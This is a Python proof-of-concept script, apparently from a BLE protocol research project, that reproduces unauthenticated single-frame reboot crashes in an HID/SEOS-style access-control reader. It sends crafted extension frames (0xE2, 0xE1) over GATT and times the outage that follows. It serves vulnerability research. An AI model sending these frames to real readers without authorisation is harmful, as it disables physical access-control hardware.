#!/usr/bin/env python3
"""Repro of the reader reboot-on-extension-frame crashes (PROTOCOL.md §35, §36).

Three unauthenticated single-frame reboot triggers found by fuzzing, all clean
(reader re-advertises and is fully functional again afterward — a watchdog-style
reboot, not a brick):

  * 0xE2 (FW_UPDATE) + any payload  -> reader replies `EOT CONFIG_FORBIDDEN`,
    then goes dark ~50-90 s (reboot).  e.g. `E2 84 00`, `E2 8C 00`.
  * 0xE1 (EOT status) + any status  -> reader drops the link, then reboots.
    e.g. `E1 01`, `E1 02`.
  * 0xE0 (raw) / other ext types    -> reader ignores (no reply, stays up) -- the
    control that shows it is the two *handled* types (0xE2/0xE1) that reboot.

Usage:
  python3 tools/fuzz_ext_reboot.py <MAC> E28400        # 0xE2 INIT_FLASH
  python3 tools/fuzz_ext_reboot.py <MAC> E101          # 0xE1 EOT status=1
  python3 tools/fuzz_ext_reboot.py <MAC> E08400        # 0xE0 raw (control)
"""
import argparse
import asyncio
import sys
import time
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))
from hid_rm import DATA_CHAR_UUID, seos

MAC_DEFAULT = "C0:60:33:15:2B:31"


async def present(mac: str, timeout: float = 2.5) -> bool:
    from bleak import BleakScanner
    return mac in await BleakScanner.discover(timeout=timeout)


async def main(mac: str, frame_hex: str):
    from bleak import BleakClient
    sys.stdout.reconfigure(line_buffering=True)
    frame = bytes.fromhex(frame_hex)
    print(f"== extension-frame reboot repro: {mac} ==", flush=True)
    print(f"   frame: {frame.hex()}", flush=True)

    # wait for the reader to be up (it has a natural dark/up cycle, §36)
    print("   waiting for reader up ...", flush=True)
    for _ in range(60):
        if await present(mac):
            break
        await asyncio.sleep(3)
    if not await present(mac):
        print("   (reader never came up in time -- try again)", flush=True)
        return

    c = BleakClient(mac)
    rx = []
    await c.connect()
    await c.start_notify(DATA_CHAR_UUID, lambda _, d: rx.append(bytes(d)))
    await asyncio.sleep(1.5)
    rx.clear()
    print("   [send]", frame.hex(), flush=True)
    await c.write_gatt_char(DATA_CHAR_UUID, frame, response=False)
    await asyncio.sleep(2.0)
    for f in rx:
        print(f"   [reply] {f.hex()}  {seos.describe(f)}", flush=True)
    if not rx:
        print("   [reply] (none -- link may have dropped)", flush=True)
    try:
        await c.disconnect()
    except Exception as e:
        print("   [disconnect]", type(e).__name__, e, flush=True)

    print("\n   [watch] advertising (reboot = a dark gap of ~50-90s):", flush=True)
    t0 = time.monotonic()
    first_dark = None
    while time.monotonic() - t0 < 90:
        if await present(mac):
            if first_dark is None:
                print("   -> STABLE (never dark this run)", flush=True)
            else:
                print(f"   -> REBOOT (dark {time.monotonic() - first_dark:.0f}s) -- reproduced", flush=True)
            return
        if first_dark is None and time.monotonic() - t0 >= 3:
            first_dark = time.monotonic()
        await asyncio.sleep(1)
    print("   -> still dark at 90s (reboot, or reader's natural dark cycle)", flush=True)


if __name__ == "__main__":
    ap = argparse.ArgumentParser()
    ap.add_argument("mac", nargs="?", default=MAC_DEFAULT)
    ap.add_argument("frame", nargs="?", default="E28400",
                    help="hex frame, e.g. E28400 (0xE2), E101 (0xE1), E08400 (0xE0)")
    args = ap.parse_args()
    asyncio.run(main(args.mac, args.frame))
